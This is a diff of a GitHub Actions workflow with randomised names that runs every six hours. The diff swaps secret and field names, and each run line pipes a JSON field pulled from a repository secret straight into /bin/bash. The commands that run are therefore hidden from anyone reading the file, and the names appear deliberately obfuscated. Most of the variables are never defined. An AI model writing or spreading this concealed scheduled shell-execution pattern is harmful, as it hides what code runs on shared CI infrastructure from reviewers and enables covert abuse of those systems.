@@ -1,9 +1,10 @@
 name: zhangshuying7654
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 4/6 * * *'
-jobs:  # 24906
+    - cron: '1 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,12 +12,12 @@ jobs:  # 24906
       - uses: actions/checkout@v4
       - name: zhangshuying7654
         env:
-          uldyi368: ${{ secrets.uldyi368 }}
+          vxp12874: ${{ secrets.vxp12874 }}
         run: |
-          echo $uldyi368 | jq -r .engl9 | /bin/bash
-          echo $mqs70 | jq -r .d4533 | /bin/bash
-          echo $a97 | jq -r .vcopu9 | /bin/bash
-          echo $fl7541 | jq -r .srk763 | /bin/bash
-          echo $jfeu30943 | jq -r .ba0 | /bin/bash
-          echo $eya0 | jq -r .tj4992 | /bin/bash
+          echo $vxp12874 | jq -r .n910 | /bin/bash
+          echo $bnwic95 | jq -r .agj30 | /bin/bash
+          echo $lb6 | jq -r .q8216 | /bin/bash
+          echo $pv101 | jq -r .e39 | /bin/bash
+          echo $oy14 | jq -r .p5 | /bin/bash
+          echo $wvdvq793 | jq -r .c39 | /bin/bash
 
